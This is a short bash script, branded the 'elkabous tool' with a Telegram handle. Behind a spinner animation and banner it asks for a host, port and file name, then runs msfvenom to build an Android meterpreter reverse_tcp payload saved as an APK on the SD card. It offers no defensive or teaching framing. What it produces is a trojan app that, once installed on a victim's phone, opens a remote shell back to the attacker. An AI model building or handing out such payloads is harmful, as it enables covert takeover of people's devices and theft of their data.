#!/bin/bash
clear
echo "starting elkabous tool ......../"
sleep 0.2
clear
echo "starting elkabous tool ........!" # | lolcat -F 20
sleep 0.2
clear
echo "starting elkabous tool ......../"
sleep 0.2
clear
echo "starting elkabous tool ........!" # | lolcat -F 20
sleep 0.2
clear
echo "starting elkabous tool ......../"
sleep 0.2
clear
echo "starting elkabous tool ........!" # | lolcat -F 20
sleep 0.2
clear
echo "starting elkabous tool ......../"
sleep 0.2
clear
echo "starting elkabous tool ........!" # | lolcat -F 20
sleep 0.2
clear
echo "starting elkabous tool ......../"
sleep 0.2
clear
echo "starting elkabous tool ........!" # | lolcat -F 20
sleep 0.2
clear
echo "starting elkabous tool ......../"
sleep 0.2
clear
echo "starting elkabous tool ........!" # | lolcat -F 20
sleep 0.2
clear
cowsay WELCOME AT ELKABOUS TOOL
echo ""
echo " --------------------------" # | lolcat -F 20
sleep 0.5
echo ""
echo "  Telegram => @ELKAB0US"
echo ""
echo " --------------------------" # | lolcat -F 20
sleep 0.5
echo ""
read -p "  Enter Your Host : " host
echo ""
echo " --------------------------" # | lolcat -F 20
sleep 0.5
echo ""
read -p "  Enter Your Port : " port
echo ""
echo " --------------------------" # | lolcat -F 20
sleep 0.5
echo ""
read -p "  Enter Payload Name : " name
echo ""
echo " --------------------------"
sleep 0.5
echo ""
echo "  Creating Your Payload Now" | lolcat -F 20
echo "  Please Wait .. " | lolcat -F 20
echo ""
echo " --------------------------"
echo ""
msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$port -o /sdcard/$name.apk
clear
echo ""
echo "  Your Payload Saved At /sdcard/$name.apk

  Thank You For Using Elkabous Tool

  Have A Nice Time " | lolcat -F 20
echo ""
echo " --------------------------"
echo ""
